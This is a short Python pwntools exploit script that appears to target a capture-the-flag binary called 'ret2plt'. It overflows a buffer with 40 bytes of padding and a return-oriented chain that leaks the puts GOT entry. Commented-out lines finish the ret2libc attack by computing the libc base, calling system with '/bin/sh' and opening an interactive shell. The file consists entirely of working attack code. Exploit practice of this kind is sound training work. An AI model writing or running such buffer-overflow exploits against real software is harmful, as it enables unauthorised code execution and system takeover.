#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process("./ret2plt")

context.arch = "amd64"
puts = 0x4004e0
puts_got = 0x0000000000601018
gets = 0x400510
pop_rdi = 0x00000000004006f3
# rop = flat([pop_rdi,puts_got,puts,pop_rdi,puts_got,gets,pop_rdi,puts_got+8,puts])
rop = flat([pop_rdi,puts_got,puts,pop_rdi,puts_got])
payload = "a"*40 + rop
r.recvuntil(":")
r.sendline(payload)
# r.recvuntil("!\n")
# libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x6f690
# system = libc + 0x45390
# r.sendline(p64(system) + "/bin/sh\x00")
r.interactive()
